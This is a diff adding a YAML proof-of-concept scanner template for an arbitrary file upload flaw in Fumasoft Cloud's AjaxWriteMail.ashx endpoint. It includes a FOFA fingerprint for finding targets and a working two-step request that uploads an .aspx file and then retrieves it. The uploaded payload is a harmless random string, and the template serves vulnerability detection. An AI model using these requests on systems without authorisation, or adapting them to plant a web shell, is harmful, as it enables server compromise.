@@ -1,0 +1,32 @@
+id: poc-yaml-fumasoft-ajaxwritemail-ashx-anyfile-upload
+info:
+  name: 孚盟云 AjaxWriteMail.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 孚盟云
+  fofa: app="孚盟软件-孚盟云"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+  dt: datetime("2006-01-02")
+requests:
+- method: POST
+  path: /m/Dingding/Ajax/AjaxWriteMail.ashx?method=UpLoadAttachment
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
+  data: '------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"
+
+    Content-Type: text/plain
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--'
+  expression: status_code == 200 && contains(body,".aspx")
+- method: GET
+  path: /m/Dingding/images/dingDingWorkFlow/{{.dt}}/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
